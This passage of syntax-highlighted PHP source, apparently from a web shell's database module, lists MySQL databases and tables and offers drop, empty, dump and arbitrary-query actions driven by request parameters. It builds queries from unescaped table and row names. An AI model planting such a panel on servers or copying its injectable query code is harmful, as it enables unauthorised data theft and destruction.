<span class="cp">&lt;?php</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$dbs</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_db</span> <span class="o">==</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span> <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot; selected&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="nv">$c</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;Databases (&quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/option&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nv">$dbs</span><span class="p">;</span>
      <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/select&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="x">    &amp;lt;/center&amp;gt;</span>
<span class="x">    &amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">-=[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;&amp;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ]=-&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
          <span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM &quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
          <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;b&amp;gt;+ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt; (&quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/br&amp;gt;&amp;lt;/b&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
          <span class="nv">$c</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No tables found in database&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="c1">#Start center panel</span>
    <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_db</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s2">&quot;no&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;There are &quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot; table(s) in database: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="o">@</span><span class="nv">$dbquicklaunch</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$dbsqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dump&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldrop&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DROP TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblempty&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldump&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$boxtbl</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="nv">$boxtbl</span><span class="p">;}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$thistbl</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;dump&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblcheck&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;CHECK TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbloptimize&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;OPTIMIZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblrepair&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;REPAIR TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblanalyze&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;ANALYZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;deleterow&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$boxrow_all</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$boxrow</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$keys</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
          <span class="nv">$akeys</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">);</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$akeys</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`, &quot;</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$keys</span><span class="p">))</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$keys</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$keys</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
          <span class="nv">$values</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
          <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span> <span class="o">=</span> <span class="nv">$sql_tbl_insert_functs</span><span class="p">[</span><span class="nv">$akeys</span><span class="p">[</span><span class="nv">$i</span><span class="p">]])</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="nv">$funct</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;, &quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$values</span><span class="p">))</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$values</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$values</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
          <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` ( &quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot; ) VALUES ( &quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot; );&quot;</span><span class="p">;</span>
          <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
          <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$set</span> <span class="o">=</span> <span class="nx">mysql_buildwhere</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">,</span><span class="s2">&quot;, &quot;</span><span class="p">,</span><span class="nv">$sql_tbl_insert_functs</span><span class="p">);</span>
          <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;UPDATE `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` SET &quot;</span><span class="o">.</span><span class="nv">$set</span><span class="o">.</span><span class="s2">&quot; WHERE &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
          <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
          <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;query&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to:&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query :&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">sql_query</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">100</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_confirm</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span>
        <span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;table&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;</span>
<span class="x">        &amp;lt;b&amp;gt;Create new table:&amp;lt;/b&amp;gt;</span>
